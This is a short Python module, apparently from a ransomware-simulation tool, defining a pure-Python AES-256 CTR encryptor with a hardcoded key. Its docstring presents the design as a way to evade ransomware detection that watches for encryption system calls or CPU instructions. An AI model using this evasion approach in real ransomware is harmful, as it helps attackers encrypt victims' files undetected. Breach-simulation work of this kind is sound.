import pyaes

# > echo "m0nk3y" | sha256sum
KEY = b"ceaf76952117275d4dfc3e3381fb9f6c7bcf76431f2ff54c3cd7bde45b2e1824"[0:32]


class StealthAES256BitManipulator:
    """
    A pure-python implementation of AES-256 (CTR).

    Some ransomware detection methods rely on checking that specific encryption-related system calls
    or CPU instructions are used. This class relies on pyaes, which is a pure-python implementation
    of AES and should make no encryption-specific system calls or use any specific CPU instructions.
    This module uses CTR mode because it is a stream cipher.
    """

    def __init__(self, key: bytes = KEY):
        """
        :param key: The key to use for encryption. Must be 32 bytes long.
        """
        self._aes = pyaes.AESModeOfOperationCTR(key)

    def __call__(self, data: bytes) -> bytes:
        return self._aes.encrypt(data)
